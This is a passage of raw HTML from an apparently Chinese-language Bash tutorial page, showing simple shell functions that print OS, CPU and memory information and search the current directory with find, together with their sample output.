readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[ 2018-08-16 19:56:34 ]: This is sample log message</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffe8358321269-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffe8358321269-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">56</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sample </span><span class=\"crayon-e\">log </span><span class=\"crayon-v\">message</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h4 id=\"toc_8\">显示系统信息</h4>\n<p>让我们创建一个显示 GNU/Linux 信息的函数</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffeb166605024\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction system_info {\r\n    echo \"### OS information ###\"\r\n    lsb_release -a\r\n\r\n    echo\r\n    echo \"### Processor information ###\"\r\n    processor=`grep -wc \"processor\" /proc/cpuinfo`\r\n    model=`grep -w \"model name\" /proc/cpuinfo  | awk -F: '{print $2}'`\r\n    echo \"Processor = $processor\"\r\n    echo \"Model     = $model\"\r\n\r\n    echo\r\n    echo \"### Memory information ###\"\r\n    total=`grep -w \"MemTotal\" /proc/meminfo | awk '{print $2}'`\r\n    free=`grep -w \"MemFree\" /proc/meminfo | awk '{print $2}'`\r\n    echo \"Total memory: $total kB\"\r\n    echo \"Free memory : $free kB\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffeb166605024-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffeb166605024-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">system_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"### OS information ###\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">lsb_release</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"### Processor information ###\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">processor</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"processor\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cpuinfo</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">model</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"model name\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cpuinfo</span> <span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">F</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $2}'</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Processor = $processor\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Model     = $model\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-13\"><span class=\"crayon-e\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"### Memory information ###\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">total</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"MemTotal\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">meminfo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $2}'</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">free</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"MemFree\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">meminfo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $2}'</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Total memory: $total kB\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffeb166605024-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Free memory : $free kB\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffeb166605024-18\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n<p>执行完后会生成以下信息：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9ffee159624412\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n### OS information ###\r\nNo LSB modules are available.\r\nDistributor ID:           Ubuntu\r\nDescription:   Ubuntu 18.04.1 LTS\r\nRelease:         18.04\r\nCodename:    bionic\r\n\r\n### Processor information ###\r\nProcessor = 1\r\nModel     =  Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz\r\n\r\n### Memory information ###\r\nTotal memory: 4015648 kB\r\nFree memory : 2915428 kB</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9ffee159624412-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9ffee159624412-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-1\"><span class=\"crayon-p\">### OS information ###</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-2\"><span class=\"crayon-e\">No </span><span class=\"crayon-e\">LSB </span><span class=\"crayon-e\">modules </span><span class=\"crayon-e\">are </span><span class=\"crayon-v\">available</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-3\"><span class=\"crayon-e\">Distributor </span><span class=\"crayon-v\">ID</span><span class=\"crayon-o\">:</span>          <span class=\"crayon-h\"> </span><span class=\"crayon-e\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-4\"><span class=\"crayon-v\">Description</span><span class=\"crayon-o\">:</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-i\">Ubuntu</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18.04.1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LTS</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-5\"><span class=\"crayon-v\">Release</span><span class=\"crayon-o\">:</span>        <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18.04</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-6\"><span class=\"crayon-v\">Codename</span><span class=\"crayon-o\">:</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">bionic</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-8\"><span class=\"crayon-p\">### Processor information ###</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-9\"><span class=\"crayon-v\">Processor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-10\"><span class=\"crayon-i\">Model</span>    <span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span> <span class=\"crayon-h\"> </span><span class=\"crayon-e\">Intel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Core</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">TM</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i7</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">7700HQ</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">CPU</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.80GHz</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-12\"><span class=\"crayon-p\">### Memory information ###</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9ffee159624412-13\"><span class=\"crayon-e\">Total </span><span class=\"crayon-v\">memory</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4015648</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kB</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9ffee159624412-14\"><span class=\"crayon-e\">Free </span><span class=\"crayon-v\">memory</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2915428</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kB</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p></p>\n<h4 id=\"toc_9\">在当前目录下查找文件或者目录</h4>\n<p>下面的函数从当前目录下查找文件或者目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9fff2890219557\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction search {\r\n    find . -name $1\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fff2890219557-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670a9fff2890219557-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fff2890219557-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9fff2890219557-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">search</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670a9fff2890219557-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5bab670a9fff2890219557-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>让我们使用下面的命令查找 <code>dir4</code> 这个目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9fff5025948050\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ search dir4</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fff5025948050-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670a9fff5025948050-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">search </span><span class=\"crayon-v\">dir4</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>当你执行完命令后，将会产生如下输出：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670a9fff8180548170\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n./dir1/dir2/dir3/dir4</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670a9fff8180548170-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" 